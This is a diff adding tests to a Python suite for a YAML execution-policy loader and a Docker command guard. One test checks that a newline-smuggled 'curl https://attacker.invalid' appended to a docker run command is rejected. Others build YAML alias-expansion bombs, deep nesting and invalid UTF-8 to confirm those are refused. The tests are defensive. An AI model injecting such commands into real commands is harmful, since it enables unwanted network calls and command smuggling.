@@ -830,6 +830,12 @@ def test_policy_rejects_repeated_yaml_merge_keys(tmp_path: Path) -> None:
 def test_quality_command_guard_rejects_exit_status_masking() -> None:
     assert _is_single_fail_fast_docker_run("docker run image pytest -q")
     assert not _is_single_fail_fast_docker_run("docker run image pytest -q || true")
+    assert not _is_single_fail_fast_docker_run(
+        "docker run image pytest -q\\ncurl https://attacker.invalid"
+    )
+    assert _is_single_fail_fast_docker_run(
+        "docker run image --entrypoint /bin/sh -ec 'ruff\\npython -m pytest'"
+    )
 
 
 def test_policy_rejects_excessive_yaml_alias_expansion(tmp_path: Path) -> None:
@@ -839,9 +845,36 @@ def test_policy_rejects_excessive_yaml_alias_expansion(tmp_path: Path) -> None:
     for index in range(12):
         source = "base" if index == 0 else f"layer{index - 1}"
         aliases += f"layer{index}: &layer{index} {{<<: [*{source}, *{source}]}}\n"
-    aliases += "execution: {<<: *layer11}\n"
+    policy = policy.replace("execution:\n", "execution:\n  <<: *layer11\n", 1)
     invalid.write_text(aliases + policy, encoding="utf-8")
     with pytest.raises(PolicyError, match="expansion"):
+        load_execution_policy(invalid)
+
+
+def test_policy_accepts_literal_merge_like_ordinary_key(tmp_path: Path) -> None:
+    valid = tmp_path / "literal-merge-key.yml"
+    text = POLICY_PATH.read_text(encoding="utf-8").replace(
+        "execution:\\n",
+        'defaults: &defaults {memory: "512m"}\\n'
+        'execution:\\n  <<: *defaults\\n  "<<merge>>": ordinary\\n',
+        1,
+    )
+    valid.write_text(text, encoding="utf-8")
+    assert load_execution_policy(valid)["memory"] == "2g"
+
+
+def test_policy_rejects_excessive_nesting_before_yaml_composition(tmp_path: Path) -> None:
+    invalid = tmp_path / "deeply-nested.yml"
+    nested = "[" * 40 + "0" + "]" * 40
+    invalid.write_text(f"version: 1\\nexecution: {nested}\\n", encoding="utf-8")
+    with pytest.raises(PolicyError, match="structural expansion limits"):
+        load_execution_policy(invalid)
+
+
+def test_policy_rejects_invalid_utf8(tmp_path: Path) -> None:
+    invalid = tmp_path / "invalid-utf8.yml"
+    invalid.write_bytes(b"\\xff")
+    with pytest.raises(PolicyError, match="UTF-8"):
         load_execution_policy(invalid)
 
 
